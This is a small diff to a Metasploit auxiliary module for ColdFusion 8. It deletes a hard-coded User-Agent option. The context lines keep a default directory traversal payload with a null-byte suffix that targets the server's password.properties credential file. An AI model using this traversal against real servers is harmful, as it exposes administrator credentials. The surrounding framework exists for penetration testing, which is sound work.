@@ -52,7 +52,6 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptString.new('URL', [ true,  "URI Path", '/CFIDE/administrator/enter.cfm']),
 				OptString.new('PATH', [ true,  "traversal and file", '../../../../../../../../../../ColdFusion8/lib/password.properties%00en']),
-				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
 			], self.class)
 	end
 
